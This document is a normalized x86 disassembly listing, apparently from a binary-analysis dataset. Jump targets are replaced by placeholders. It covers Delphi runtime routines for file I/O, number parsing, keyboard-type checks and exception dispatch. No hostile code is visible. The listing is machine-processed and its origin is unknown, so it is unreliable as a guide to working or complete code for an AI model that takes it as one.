cmp cl [ edx + 0x2 ]
jne r-xdata
sub_403abc
cmp [ eax + 0x4 ] 0xd7b1
jne r-xdata
push eax
call sub_403bcc
pop edx
cmp ah 0x1a
je r-xdata
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x10 ]
jae r-xdata
mov al 0x1
retn
dec [ edx + 0xc ]
add edx [ eax + 0x14 ]
test [ eax + 0x6 ] 0x1
je r-xdata
xor eax eax
retn
mov cl [ edx ]
cmp cl 0x1a
jne r-xdata
sub_403af4
cmp edx 0x20
mov ch cl
jl r-xdata
test edx edx
jle r-xdata
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] cx
sub edx 0x10
fld [ eax ]
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
mov ecx eax
and ecx 0x7
sub ecx 0x8
sub eax ecx
add edx ecx
add eax edx
neg edx
retn
mov [ edx + eax - 0x1 ] cl
and edx 0xfffffffe
neg edx
lea edx [ edx * 2 + r-xdata ]
jmp edx
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
add edx 0x10
jl r-xdata
ffree st0
retn
mov [ eax + 0x1c ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x18 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x12 ] cx
mov [ eax + 0x10 ] cx
mov [ eax + 0xe ] cx
mov [ eax + 0xc ] cx
mov [ eax + 0xa ] cx
mov [ eax + 0x8 ] cx
mov [ eax + 0x6 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x2 ] cx
mov [ eax ] cx
retn
sub_403b90
push ebx
mov ebx eax
cmp ebx rw-data
jne r-xdata
cmp [ ebx + 0x4 ] 0xd7b1
sete al
mov ebx eax
test bl bl
jne r-xdata
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov eax ebx
call sub_4034f4
mov eax ebx
pop ebx
retn
mov eax 0x68
call sub_40307c
sub_403bcc
cmp [ eax + 0x4 ] 0xd7b1
je r-xdata
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x10 ]
jae r-xdata
push eax
call sub_403b90
test al al
pop eax
je r-xdata
push eax
call [ eax + 0x1c ]
test eax eax
jne r-xdata
test [ eax + 0x6 ] 0x1
mov ecx [ eax + 0x14 ]
mov cl [ edx + ecx ]
je r-xdata
mov cl 0x1a
mov ah cl
mov al cl
retn
call sub_40307c
pop eax
pop eax
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x10 ]
jb r-xdata
inc edx
mov [ eax + 0xc ] edx
xor eax eax
mov al cl
retn
cmp cl 0x1a
je r-xdata
test [ eax + 0x6 ] 0x1
je r-xdata
mov ecx [ eax + 0x14 ]
mov [ edx + ecx ] 0x1a
inc [ eax + 0x10 ]
jmp r-xdata
sub_403c38
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
cmp [ eax + 0x4 ] 0xd7b1
je r-xdata
mov ebx eax
test esi esi
jle r-xdata
push eax
call sub_403b90
test al al
pop eax
je r-xdata
mov eax ebx
pop ecx
sub ecx esi
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx edx
add edx [ ebx + 0x14 ]
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_403bcc
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx edx
add edx [ ebx + 0x14 ]
test ah ah
je r-xdata
mov al [ edx ]
inc edx
cmp al 0xa
je r-xdata
dec edx
cmp al 0xd
je r-xdata
mov al [ edx ]
cmp al 0xa
jne r-xdata
cmp al 0x1a
je r-xdata
dec ecx
jl r-xdata
test [ ebx + 0x6 ] 0x1
je r-xdata
stosb [ edi ]
dec esi
jg r-xdata
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x14 ]
mov [ ebx + 0xc ] edx
jmp r-xdata
sub_403cc4
push ebx
push esi
mov ebx eax
mov esi edx
mov eax edx
call sub_405530
sub esp 0x100
mov eax ebx
mov edx esp
mov ecx 0xff
call sub_403cb8
mov eax esi
mov edx esp
call sub_405794
cmp [ esp ] 0xff
jne r-xdata
add esp 0x100
pop esi
pop ebx
retn
mov eax ebx
mov edx esp
mov ecx 0xff
call sub_403cb8
mov edx esp
push 0x0
mov eax esp
call sub_405794
mov eax esi
mov edx [ esp ]
call sub_405818
mov eax esp
call sub_405530
pop eax
cmp [ esp ] 0xff
je r-xdata
sub_403d30
push ebx
mov ebx eax
pop ebx
retn
cmp ah 0x1a
je r-xdata
cmp al 0xd
jne r-xdata
mov eax ebx
call sub_403bcc
cmp al 0xa
je r-xdata
mov eax ebx
call sub_403bcc
cmp al 0xa
je r-xdata
cmp ah 0x1a
je r-xdata
dec [ ebx + 0xc ]
jmp r-xdata
sub_403d60
push ebx
push esi
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
xor esi esi
mov eax [ ebx ]
call sub_403594
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40308c
mov esi 0x1
sub_403d88
push ebx
push esi
push edi
mov esi edx
mov edi ecx
xor edx edx
mov ebx eax
mov dx [ eax + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov [ ebx + 0x4 ] 0xd7b3
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x24 ] sub_403d60
mov [ ebx + 0x1c ] sub_403554
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edx 0x3
ja r-xdata
mov [ ebx + 0x24 ] sub_403554
cmp edi 0x3
je r-xdata
mov eax 0xc0000000
mov dl [ rw-data ]
and edx 0x70
shr edx 0x2
mov edx [ edx + rw-data ]
mov ecx 0x2
sub edi 0x3
je r-xdata
mov eax 0x66
jmp r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ ebx + 0x48 ]
push eax
call sub_40124c
mov ecx 0x3
inc edi
je r-xdata
call sub_40307c
call sub_40307c
cmp eax 0xffffffff
je r-xdata
call sub_401264
jmp r-xdata
mov [ ebx + 0x4 ] 0xd7b0
call sub_4012f4
mov [ ebx ] eax
jmp r-xdata
mov eax 0x40000000
inc edi
mov [ ebx + 0x4 ] 0xd7b2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x80000000
mov [ ebx + 0x4 ] 0xd7b1
sub_403e90
mov ecx eax
movzx eax [ eax + 0x4 ]
sub eax 0xd7b1
cmp eax 0x2
ja r-xdata
mov eax 0x67
jmp sub_40307c
push 0x0
mov eax [ ecx + 0x8 ]
mul edx
push 0x0
push eax
push [ ecx ]
call sub_40128c
inc eax
je sub_40308c
retn
sub_403ec4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_403f98
push ebx
mov ebx eax
cmp ebx rw-data
je r-xdata
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov eax ebx
call sub_403500
cmp ebx rw-data
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax 0x69
call sub_40307c
cmp [ ebx + 0x4 ] 0xd7b2
sete al
mov ebx eax
test bl bl
jne r-xdata
sub_403fdc
push esi
push edi
mov esi edx
cmp [ eax + 0x4 ] 0xd7b2
je r-xdata
mov edi [ eax + 0x14 ]
add edi [ eax + 0xc ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx ecx
jg r-xdata
push eax
push edx
push ecx
call sub_403f98
test al al
pop ecx
pop edx
pop eax
je r-xdata
add [ eax + 0xc ] ecx
[ edi ] [ esi ]
add [ eax + 0xc ] edx
sub ecx edx
push eax
push ecx
mov ecx edx
[ edi ] [ esi ]
call [ eax + 0x1c ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_40307c
pop ecx
pop eax
pop edi
pop esi
retn
pop ecx
pop eax
jmp r-xdata
sub_404030
mov ecx edx
test ecx ecx
jg sub_403fdc
sub ecx 0x40
push eax
push ecx
mov ecx 0x40
call sub_403fdc
call sub_407688
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
pop ecx
pop eax
retn
pop ecx
pop eax
jmp r-xdata
mov edx r-xdata
cmp ecx 0x40
jle r-xdata
sub_4040ac
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x6 ] 0x1
je r-xdata
mov [ esp ] 0xa
mov edx esp
mov eax ebx
mov ecx 0x1
call sub_403fdc
mov esi eax
mov [ esp ] 0xd
mov [ esp + 0x1 ] 0xa
mov edx esp
mov eax ebx
mov ecx 0x2
call sub_403fdc
mov esi eax
jmp r-xdata
mov eax ebx
call sub_40382c
mov eax esi
pop edx
pop esi
pop ebx
retn
sub_404100
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_40412c
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_4041df ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_4041df ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_4041df
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_404418
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_404448
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_40135c
test eax eax
jne r-xdata
movzx eax [ rw-data ]
and ax 0xffc0
movzx edx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4044b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401364
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401354
retn
sub_404544
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4045cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax ebx
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
mov eax esi
call sub_40580c
push eax
mov eax esi
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_40580c
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x1
push 0x800
call sub_4012ac
cmp eax 0x2
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4045d2
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_40465c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4046b4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4060ac
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4046d4
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_407024
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_404704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_404788
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_404798
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40478f
lea eax [ ebp - 0x8 ]
call sub_40700c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4046d4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_407024
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_404798
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4047dc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_40487c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40481c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40484c
push eax
push ecx
mov eax [ eax ]
call sub_40481c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_405470
call [ rw-data ]
sub_404864
push esi
mov esi edx
mov eax [ eax ]
call sub_40481c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_405470
call [ rw-data ]
sub_4048ac
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40481c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4048d4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_404924
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_404974
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_40499d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4049cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4049fb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax [ ebp - 0x4 ]
pop [ fs : 0x0 ]
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_404a48
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_404a84
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_404a98
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_404aac
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_404acc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_404aac
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_404b30
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_40450c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_407688
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_404a98
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_404a48
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_404c5c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_40450c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_404a48
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_407688
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_404a84
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_403a4c
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_404de4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
push ebx
xor ebx ebx
push esi
push edi
push ebp
push ebp
push sub_404e64
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ fs : ebx ]
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
push ebx
push eax
push edx
push ecx
mov edi [ esp + 0x34 ]
call sub_407688
push [ eax ]
mov [ eax ] esp
mov ecx [ edi + 0x4 ]
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] sub_404e64
add ecx 0x5
call sub_404acc
call ecx
call sub_407688
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
add esp 0x14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_404e64
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_404acc
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_404ec4
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_405470
sub_404eec
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_407688
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_404650
call sub_404a2c
sub_404f40
call sub_407688
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_404650
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_404af4
jmp edx
sub_404f88
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
movzx eax al
mov edx [ edx + 0xc ]
call sub_402ff8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_4050e8
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
